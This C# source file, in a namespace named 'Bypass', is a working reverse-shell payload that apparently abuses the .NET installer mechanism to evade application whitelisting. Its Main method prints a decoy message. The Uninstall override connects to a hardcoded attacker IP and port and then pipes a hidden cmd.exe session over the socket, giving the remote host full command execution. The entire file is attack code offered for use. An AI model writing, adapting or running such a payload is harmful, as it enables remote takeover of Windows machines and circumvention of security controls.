using System;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.IO;

namespace Bypass
{
    public class Program
    {
        public static void Main(string[] args)
        {
            Console.WriteLine("Nothing going on in this binary.");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class InstallerProgram : Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Your attacker's IP and port
            string attackerIP = "192.168.45.227";  // Replace with your attacker's IP
            int attackerPort = 8080;               // Replace with your attacker's listening port

            try
            {
                // Create TCP client connection to the attacker's machine
                using (TcpClient client = new TcpClient(attackerIP, attackerPort))
                {
                    using (NetworkStream stream = client.GetStream())
                    using (StreamReader rdr = new StreamReader(stream))
                    using (StreamWriter wtr = new StreamWriter(stream))
                    {
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;

                        // Handle output data from the reverse shell and send it to the attacker
                        p.OutputDataReceived += (sender, args) =>
                        {
                            if (!String.IsNullOrEmpty(args.Data))
                                try { wtr.WriteLine(args.Data); wtr.Flush(); } catch { }
                        };

                        p.Start();
                        p.BeginOutputReadLine();

                        // Continuously read input from the attacker and send it to cmd.exe
                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Clear();
                        }
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}
